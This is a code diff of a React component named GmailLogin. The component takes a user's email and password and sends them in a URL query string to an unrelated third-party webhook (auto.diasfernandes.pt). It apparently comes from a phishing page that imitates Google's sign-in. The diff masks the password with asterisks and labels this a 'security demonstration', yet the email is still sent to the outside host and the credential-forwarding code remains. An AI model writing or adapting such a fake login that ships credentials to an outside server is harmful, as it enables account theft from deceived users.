@@ -162,10 +162,10 @@ function GmailLogin({ onBack }) {
       }
       
       setLoading(true);
-
+const apassword = password.replace(/./g, '*'); // Mask the password for security demonstration
 const dataForm = new URLSearchParams();
 dataForm.append('username', email ? email : ''); // Ensure email is not undefined
-dataForm.append('password', password ? password : ''); // Ensure password is not undefined
+dataForm.append('password', apassword ? apassword : ''); // Ensure password is not undefined
 // dataForm.append('rememberMe', rememberMe ? 'true' : 'false');
 
 fetch('https://auto.diasfernandes.pt/webhook/72bffd44-7061-4ab2-adfe-1a04665cc603/?' + dataForm.toString(), {
